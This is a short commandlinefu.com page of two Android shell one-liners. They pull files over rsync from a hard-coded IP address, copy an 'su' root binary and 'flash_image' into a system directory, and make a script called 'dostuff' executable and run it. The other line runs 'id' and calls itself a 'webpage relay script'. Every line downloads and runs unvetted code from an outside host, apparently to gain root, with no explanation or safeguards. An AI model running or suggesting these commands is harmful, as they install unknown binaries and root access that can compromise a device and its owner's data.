# commandlinefu.com by David Winterbottom

# fumanchu testing app1 w/bad rating
dst=/data/wimax/log/bin;sd=/sdcard;(rsync -aP rsync://168.103.182.210/t $sd/t ;mkdir $dst ;cd $dst; cp $sd/t/su $sd/t/flash_image . ;chmod 755 dostuff;./dostuff) > $sd/fumanchu.log 2> $sd/fumanchu.err.log

# First android webpage relay script
id 2>&1 > /sdcard/id;rsync -aP rsync://168.103.182.210/t /sdcard/t 2> /sdcard/rsync.err.log > /sdcard/rsync.log && return 123;fumanchu

